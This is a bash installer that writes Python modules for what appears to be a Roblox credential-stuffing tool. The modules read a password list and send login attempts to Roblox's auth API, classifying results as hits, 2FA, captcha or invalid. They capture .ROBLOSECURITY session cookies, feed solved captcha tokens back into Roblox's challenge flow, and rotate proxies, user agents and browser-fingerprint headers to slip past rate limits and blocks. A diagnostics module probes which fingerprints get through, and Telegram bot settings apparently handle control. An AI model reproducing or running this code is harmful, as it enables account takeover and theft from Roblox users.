#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"
w() { cat > "$1"; }

w src/config.py <<'PY'
import os, re

BASE = os.environ.get("SVCHOME") or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA = os.path.join(BASE, ".d")
os.makedirs(DATA, exist_ok=True)

try:
    from _secret import _SECRET
except Exception:
    _SECRET = {}


def _env(path):
    d = {}
    try:
        with open(path, encoding="utf-8-sig") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                d[k.strip().upper()] = v.strip().strip('"').strip("'")
    except Exception:
        pass
    return d


E = _env(os.path.join(BASE, ".env"))


def _clean(v):
    return v.strip() if isinstance(v, str) else v


def _san(v):
    """Buang karakter invisible (zero-width, BOM, newline) dari kredensial."""
    return re.sub(r"[^0-9A-Za-z_:\-]", "", v or "")


def get(key, default=""):
    key = key.upper()
    for src in (_SECRET, E, os.environ):
        try:
            v = _clean(src.get(key))
        except Exception:
            continue
        if v not in (None, ""):
            return v
    return default


def geti(key, default=0):
    s = _san(str(get(key, default))).strip()
    try:
        return int(s)
    except Exception:
        try:
            return int(float(s))
        except Exception:
            return default


def getf(key, default=0.0):
    try:
        return float(_san(str(get(key, default))) or default)
    except Exception:
        return default


def getb(key, default=False):
    v = str(get(key, "1" if default else "0")).strip().lower()
    return v not in ("0", "false", "no", "off", "")


BOT_TOKEN = _san(get("BOT_TOKEN"))
OWNER_ID = geti("OWNER_ID", 0)
AUTO_OWNER = getb("AUTO_OWNER", True)
GITHUB_TOKEN = _san(get("GITHUB_TOKEN"))
GIST_ID = _san(get("GIST_ID"))

UA = get("USER_AGENT", "Roblox/WinInet")
PROXY = get("PROXY", "")
HTTP_TIMEOUT = geti("HTTP_TIMEOUT", 20) or 20
MIN_DELAY = getf("MIN_DELAY", 1.1) or 1.1
MAX_DELAY = getf("MAX_DELAY", 4.0) or 4.0
WORKERS = geti("WORKERS", 2) or 2
ROTATE_UA = getb("ROTATE_UA", False)
FARM_THREADS = geti("FARM_THREADS", 4) or 4

MAX_ATTEMPTS = geti("MAX_ATTEMPTS", 3) or 3
RETRY_DELAY = getf("RETRY_DELAY", 20.0)
CAPTCHA_DELAY = getf("CAPTCHA_DELAY", 90.0)
MAX_CAPTCHA_TRIES = geti("MAX_CAPTCHA_TRIES", 5) or 5

BACKUP_EVERY = geti("BACKUP_EVERY", 600) or 600
BACKUP_FULL = getb("BACKUP_FULL", True)

CAPTCHA_MODE = (get("CAPTCHA_MODE", "auto") or "auto").lower()
CAPTCHA_ACTION_TYPE = get("CAPTCHA_ACTION_TYPE", "Login")
CAPTCHA_PUBLIC_KEY = get("CAPTCHA_PUBLIC_KEY", "")
KEYS_URL = get("KEYS_URL", "https://apis.rbxcdn.com/captcha/v1/metadata")
WARM_TIMEOUT = getf("WARM_TIMEOUT", 300.0)
WARM_RETRY = getf("WARM_RETRY", 600.0)
WARM_PAGE = get("WARM_PAGE", "https://adiprmx.github.io/svc/warm.html")
CAPTCHA_BREAKER_WINDOW = geti("CAPTCHA_BREAKER_WINDOW", 10) or 10
CAPTCHA_BREAKER_RATE = getf("CAPTCHA_BREAKER_RATE", 0.5)

MODE = (os.environ.get("SVCMODE") or get("SVCMODE", "full") or "full").lower()
DURATION = geti("SVC_DURATION", 0)
SHARD = geti("SVC_SHARD", 0)
SHARDS = geti("SVC_SHARDS", 1) or 1
FORCE = getb("SVC_FORCE", False)
DOCTOR = getb("SVC_DOCTOR", True)

DB_PATH = os.path.join(DATA, "rbx.db")
PWFILE = os.path.join(DATA, "passwords.txt")
SEED_PWFILE = os.path.join(BASE, "data", "passwords.txt")
LOG_PATH = os.path.join(BASE, "x.log")
OWNER_FILE = os.path.join(DATA, "owner.txt")


def problems():
    out = []
    if not BOT_TOKEN:
        out.append("BOT_TOKEN kosong")
    elif ":" not in BOT_TOKEN or len(BOT_TOKEN) < 40:
        out.append("BOT_TOKEN format aneh (len=%d)" % len(BOT_TOKEN))
    if not AUTO_OWNER and not OWNER_ID:
        out.append("OWNER_ID 0 dan AUTO_OWNER mati")
    return out


def describe():
    def mask(v):
        return "-" if not v else (v[:6] + "..." + v[-4:] if len(v) > 12 else v)
    import sys
    return ("python=%s mode=%s\nBASE=%s\nBOT_TOKEN=%s (len=%d)\nOWNER_ID=%s "
            "auto_owner=%s\nUA=%s workers=%d captcha=%s" % (
                sys.version.split()[0], MODE, BASE, mask(BOT_TOKEN), len(BOT_TOKEN),
                OWNER_ID or "(belum di-set)", AUTO_OWNER, UA, WORKERS, CAPTCHA_MODE))
PY

w src/util.py <<'PY'
import gzip, http.cookiejar, json, logging, urllib.error, urllib.request

log = logging.getLogger("svc.http")


class Session:
    def __init__(self, ua=None, timeout=20, proxy=None):
        import config
        self.ua = ua or config.UA
        self.timeout = timeout or config.HTTP_TIMEOUT
        self.proxy = proxy if proxy is not None else (config.PROXY or None)
        self.csrf = None
        self.extra = {}
        self.jar = http.cookiejar.CookieJar()
        self._build()

    def _build(self):
        handlers = [urllib.request.HTTPCookieProcessor(self.jar)]
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler({"http": self.proxy,
                                                         "https": self.proxy}))
        self.opener = urllib.request.build_opener(*handlers)

    def clear_cookies(self):
        self.jar.clear()
        self.csrf = None

    def drop_cookie(self, name):
        keep = [c for c in self.jar if c.name != name]
        self.jar.clear()
        for c in keep:
            self.jar.set_cookie(c)

    def cookie(self, name):
        for c in self.jar:
            if c.name == name:
                return c.value
        return None

    @property
    def roblosecurity(self):
        return self.cookie(".ROBLOSECURITY")

    def probe_csrf(self, url, method="POST", body=None):
        """POST HARUS pakai body {} biar Content-Type kebentuk dan Roblox
        mau ngasih header x-csrf-token."""
        if body is None and method.upper() == "POST":
            body = {}
        try:
            self.request(method, url, body)
        except Exception:
            pass
        return self.csrf

    def request(self, method, url, body=None, headers=None):
        h = {"User-Agent": self.ua,
             "Accept": "application/json, text/plain, */*",
             "Accept-Encoding": "gzip",
             "Accept-Language": "en-US,en;q=0.9"}
        data = None
        if body is not None:
            data = json.dumps(body).encode()
            h["Content-Type"] = "application/json;charset=UTF-8"
        if self.csrf:
            h["x-csrf-token"] = self.csrf
        h.update(self.extra)
        if headers:
            h.update(headers)

        req = urllib.request.Request(url, data=data, headers=h, method=method)
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                code, hdr, raw = r.status, r.headers, r.read()
        except urllib.error.HTTPError as e:
            code, hdr, raw = e.code, e.headers, e.read()
        except Exception as e:
            log.debug("req fail %s %s: %r", method, url, e)
            return 0, {}, "", None

        if hdr.get("Content-Encoding") == "gzip":
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass
        text = raw.decode("utf-8", "replace")
        try:
            js = json.loads(text)
        except Exception:
            js = None
        tok = hdr.get("x-csrf-token")
        if tok:
            self.csrf = tok
        return code, hdr, text, js
PY

w src/rblx.py <<'PY'
import base64, json, logging, random, time

import config, util

log = logging.getLogger("svc.rblx")

AUTH = "https://auth.roblox.com"
APIS = "https://apis.roblox.com"
CHALLENGE = APIS + "/challenge/v1/continue"
LOGIN_KEY = "476068BF-9607-4799-B53D-966BE98E2B81"

UAS = [
    "Roblox/WinInet",
    "Roblox/2.616.551 (Android; Android 12; SM-G991B)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
]

# (method, url, body) -- body WAJIB {} biar x-csrf-token dibalikin
CSRF_PROBES = [
    ("POST", AUTH + "/v2/login", {}),
    ("POST", AUTH + "/v2/logout", {}),
    ("POST", AUTH + "/v2/logout", None),
    ("POST", "https://www.roblox.com/mobileapi/logout", {}),
]

BROWSER_HDR = {"Origin": "https://www.roblox.com", "Referer": "https://www.roblox.com/"}

SEC_HDR = {
    "sec-ch-ua": '"Chromium";v="126", "Google Chrome";v="126", "Not.A/Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

_keys = {"ts": 0.0, "v": {}}


def public_key(kind="ACTION_TYPE_WEB_LOGIN"):
    if config.CAPTCHA_PUBLIC_KEY:
        return config.CAPTCHA_PUBLIC_KEY
    if _keys["v"] and time.time() - _keys["ts"] < 3600:
        return _keys["v"].get(kind) or LOGIN_KEY
    try:
        s = util.Session("Roblox/WinInet", 10)
        code, hdr, text, js = s.request("GET", config.KEYS_URL)
        if code == 200 and isinstance(js, dict):
            _keys["v"] = js.get("funCaptchaPublicKeys") or {}
            _keys["ts"] = time.time()
    except Exception:
        pass
    return _keys["v"].get(kind) or LOGIN_KEY


def _b64json(raw):
    try:
        return json.loads(base64.b64decode(raw).decode("utf-8", "replace"))
    except Exception:
        return None


def parse_challenge(hdr):
    cid = hdr.get("rblx-challenge-id")
    ctype = hdr.get("rblx-challenge-type") or "captcha"
    raw = hdr.get("rblx-challenge-metadata")
    outer = _b64json(raw) if raw else None
    if not isinstance(outer, dict):
        outer = {}
    cid = outer.get("challengeId") or cid
    ctype = outer.get("challengeType") or ctype
    meta = outer.get("challengeMetadata")
    if isinstance(meta, str):
        try:
            meta = json.loads(meta)
        except Exception:
            meta = {}
    if not isinstance(meta, dict):
        meta = {}
    if not meta:
        meta = {k: v for k, v in outer.items()
                if k not in ("challengeId", "challengeType")}
    return {"id": cid, "type": ctype, "meta": meta,
            "blob": meta.get("dataExchangeBlob") or meta.get("blob") or "",
            "public_key": meta.get("publicKey") or "", "token": None,
            "meta_solved": None}


def solve_metadata(ch, token):
    meta = dict(ch.get("meta") or {})
    meta["captchaToken"] = token
    if ch.get("type") == "captcha":
        meta.setdefault("actionType", config.CAPTCHA_ACTION_TYPE)
    return meta


class Roblox:
    def __init__(self, ua=None, timeout=None, proxy=None, sec=False):
        self.s = util.Session(ua or config.UA, timeout, proxy)
        self.s.extra.update(BROWSER_HDR)
        if sec or (self.s.ua or "").startswith("Mozilla"):
            self.s.extra.update(SEC_HDR)
        self.challenge = None

    def reset(self, soft=False):
        if soft:
            self.s.drop_cookie(".ROBLOSECURITY")
        else:
            self.s.clear_cookies()
        self.challenge = None

    def csrf(self):
        for method, url, body in CSRF_PROBES:
            try:
                self.s.request(method, url, body)
            except Exception:
                continue
            if self.s.csrf:
                log.info("csrf didapat dari %s", url)
                return self.s.csrf
        log.warning("csrf KOSONG dari semua probe")
        return None

    @staticmethod
    def _ctype(user):
        return "Email" if "@" in (user or "") else "Username"

    def login(self, username, password, challenge_headers=None):
        if not self.s.csrf:
            self.csrf()
        body = {"ctype": self._ctype(username), "cvalue": username,
                "password": password}
        extra = dict(challenge_headers or {}) or None
        status, detail = "error", "belum jalan"
        for attempt in (1, 2, 3):
            code, hdr, text, js = self.s.request("POST", AUTH + "/v2/login", body,
                                                 headers=extra)
            status, detail = classify(code, hdr, js, text)
            if status in ("captcha", "2fa"):
                self.challenge = parse_challenge(hdr)
            if status != "csrf":
                break
            log.info("csrf ditolak, refresh (percobaan %d)", attempt)
            self.s.csrf = None
            self.csrf()
            time.sleep(0.4)
        return status, detail, self.s.roblosecurity

    def login_2fa(self, username, password, code2, challenge=None):
        ch = challenge or self.challenge
        if not self.s.csrf:
            self.csrf()
        body = {"ctype": self._ctype(username), "cvalue": username,
                "password": password, "twoStepVerificationCode": code2}
        code, hdr, text, js = self.s.request("POST", AUTH + "/v2/login", body,
                                             headers=self.challenge_headers(ch))
        return classify(code, hdr, js, text) + (self.s.roblosecurity,)

    def continue_challenge(self, token, challenge=None):
        ch = challenge or self.challenge
        if not ch or not ch.get("id"):
            return False
        ch["token"] = token
        meta = solve_metadata(ch, token)
        ch["meta_solved"] = meta
        payload = {"challengeId": ch["id"],
                   "challengeType": ch.get("type") or "captcha",
                   "challengeMetadata": json.dumps(meta)}
        if not self.s.csrf:
            self.s.probe_csrf(CHALLENGE, "POST", payload)
        code, hdr, text, js = self.s.request("POST", CHALLENGE, payload)
        if code == 403 and "token validation" in (text or "").lower():
            self.s.csrf = None
            self.s.probe_csrf(CHALLENGE, "POST", payload)
            code, hdr, text, js = self.s.request("POST", CHALLENGE, payload)
        return code == 200

    def challenge_headers(self, challenge=None):
        ch = challenge or self.challenge
        if not ch or not ch.get("id") or not ch.get("token"):
            return None
        meta = ch.get("meta_solved") or solve_metadata(ch, ch["token"])
        return {"Rblx-Challenge-Id": ch.get("id"),
                "Rblx-Challenge-Type": ch.get("type") or "captcha",
                "Rblx-Challenge-Metadata": base64.b64encode(
                    json.dumps(meta).encode()).decode()}


def _msg_of(js):
    """Roblox bisa balikin {'errors':[{'message':..}]} ATAU flat {'message':..}."""
    if not isinstance(js, dict):
        return ""
    m = js.get("message")
    if isinstance(m, str) and m:
        return m
    errs = js.get("errors")
    if isinstance(errs, list) and errs and isinstance(errs[0], dict):
        return errs[0].get("message") or ""
    if isinstance(errs, str):
        return errs
    return ""


def classify(code, hdr, js, text):
    if code == 200:
        if isinstance(js, dict) and js.get("twoStepVerificationRequired"):
            return "2fa", "twoStepVerificationRequired"
        return "hit", "ok"
    if code == 429:
        return "ratelimited", hdr.get("Retry-After") or ""
    if code in (400, 403):
        ctype = (hdr.get("rblx-challenge-type") or "").lower()
        msg = _msg_of(js)
        low = msg.lower()
        if hdr.get("rblx-challenge-id") or ctype == "captcha" or "captcha" in low:
            return "captcha", msg or ctype
        if ctype == "twostepverification" or "two step" in low or "two-step" in low:
            return "2fa", msg
        if "token validation" in low or "csrf" in low:
            return "csrf", msg
        if "too many" in low or "flood" in low or "try again" in low:
            return "ratelimited", msg
        if "banned" in low or "deleted" in low or "disabled" in low:
            return "banned", msg
        if "incorrect" in low or "invalid" in low or "doesn't exist" in low:
            return "invalid", msg
        if not msg:
            return "blocked", "%s non-json %s" % (code, (text or "")[:60])
        return "denied", "%s | %s" % (code, msg[:80])
    return "error", "%s %s" % (code, (text or "")[:200])
PY

w src/doctor.py <<'PY'
import json, os, sys, time
import urllib.error, urllib.parse, urllib.request

import config, rblx, util

OUT = []


def say(t=""):
    print(t, flush=True)
    OUT.append(str(t))


def tg(method, **p):
    url = "https://api.telegram.org/bot%s/%s" % (config.BOT_TOKEN, method)
    data = urllib.parse.urlencode(p).encode() if p else None
    try:
        with urllib.request.urlopen(url, data=data, timeout=25) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"ok": False, "err": "http %s" % e.code}
    except Exception as e:
        return {"ok": False, "err": repr(e)}


def out_ip():
    for u in ("https://api.ipify.org?format=json", "https://ifconfig.me/all.json"):
        try:
            with urllib.request.urlopen(u, timeout=10) as r:
                j = json.loads(r.read().decode())
            return j.get("ip") or j.get("ip_addr") or "?"
        except Exception:
            pass
    return "?"


def tg_check():
    t = config.BOT_TOKEN
    say("[info] token len=%d ascii=%s bot_id=%s" % (len(t), t.isascii(), t.split(":")[0]))
    if not t:
        say("[FAIL] BOT_TOKEN kosong")
        return False
    me = tg("getMe")
    if not me.get("ok"):
        say("[FAIL] getMe -> %s" % me)
        if me.get("error_code") == 404:
            say("       token-nya gak match / ada karakter invisible.")
            say("       coba: re-copy token dari BotFather, tempel ulang di .env")
        elif me.get("error_code") == 401:
            say("       token salah atau udah di-revoke -> ambil ulang di @BotFather")
        return False
    say("[ OK ] token valid, bot = @%s" % (me.get("result") or {}).get("username"))
    up = tg("getUpdates", limit=5)
    chats = [((x.get("message") or {}).get("chat") or {}).get("id")
             for x in (up.get("result") or [])]
    chats = [c for c in chats if c]
    if chats:
        say("[info] chat antre: %s" % chats)
        if config.AUTO_OWNER and not config.OWNER_ID:
            say("[ OK ] AUTO_OWNER aktif -> chat %s bakal diadopsi" % chats[0])
    else:
        say("[info] belum ada pesan antre (kirim /start ke bot dulu)")
    if config.OWNER_ID:
        say("[ OK ] OWNER_ID=%s" % config.OWNER_ID)
    return True


def net_check():
    say("[info] outbound IP: %s" % out_ip())
    s = util.Session(config.UA, 15)
    s.extra.update(rblx.BROWSER_HDR)
    code, hdr, text, js = s.request("GET", "https://users.roblox.com/v1/users/1")
    say("[%s] users/1 -> %s" % (" OK " if code == 200 else "FAIL", code))
    return code == 200


def csrf_check():
    say("== csrf probe ==")
    best = None
    for method, url, body in rblx.CSRF_PROBES:
        s = util.Session("Roblox/WinInet", 15)
        s.extra.update(rblx.BROWSER_HDR)
        code, hdr, text, js = s.request(method, url, body)
        got = bool(hdr.get("x-csrf-token"))
        say("  %-6s %-42s -> %s csrf=%s" % (method, url.replace("https://", "")[:42],
                                            code, "ADA" if got else "kosong"))
        if got and best is None:
            best = url
        time.sleep(0.3)
    say("[%s] csrf probe: %s" % (" OK " if best else "FAIL", best or "gak ada yang kasih token"))
    return bool(best)


def fp_check():
    profiles = [("minimal", dict(rblx.BROWSER_HDR)),
                ("browser+sec", dict(rblx.BROWSER_HDR, **rblx.SEC_HDR))]
    uas = ["Roblox/WinInet", rblx.UAS[2]]
    best = None
    for pname, extra in profiles:
        for ua in uas:
            cli = rblx.Roblox(ua)
            cli.s.extra.update(extra)
            tok = cli.csrf()
            code, hdr, text, js = cli.s.request(
                "POST", rblx.AUTH + "/v2/login",
                {"ctype": "Username", "cvalue": "Roblox", "password": "dummy_1"})
            st, det = classify_safe(code, hdr, js, text)
            say("[%-18s] -> %s %s | csrf=%s" % (pname + "/" + ua[:10], code, st,
                                                "ada" if tok else "KOSONG"))
            if st in ("invalid", "csrf", "captcha", "ratelimited", "2fa"):
                best = best or ("%s/%s" % (pname, ua[:10]))
            if st in ("blocked", "denied", "csrf"):
                say("        body: %s" % (text or "")[:180].replace("\n", " "))
            time.sleep(0.8)
    say("[%s] fingerprint: %s" % (" OK " if best else "FAIL", best or "gak ada yang nembus"))
    return bool(best)


def classify_safe(code, hdr, js, text):
    try:
        return rblx.classify(code, hdr, js, text)
    except Exception as e:
        return "error", repr(e)


def preflight():
    say("=" * 46)
    say(" svc doctor v2")
    say("=" * 46)
    say(config.describe())
    say("-" * 46)
    a = tg_check()
    say("-" * 46)
    b = net_check()
    say("-" * 46)
    c = csrf_check()
    say("-" * 46)
    d = fp_check()
    say("-" * 46)
    for p in config.problems():
        say("[WARN] %s" % p)
    ok = a and b and c and d
    say("HASIL: %s" % ("SIAP" if ok else "ADA MASALAH"))
    say("=" * 46)
    try:
        os.makedirs(os.path.join(config.BASE, "out"), exist_ok=True)
        with open(os.path.join(config.BASE, "out", "doctor.txt"), "w",
                  encoding="utf-8") as f:
            f.write("\n".join(OUT) + "\n")
    except Exception:
        pass
    return ok
PY

python3 - <<'PY'
import sys
sys.path.insert(0, "src")
import config, util, rblx, doctor
print("import OK | token len =", len(config.BOT_TOKEN))
PY
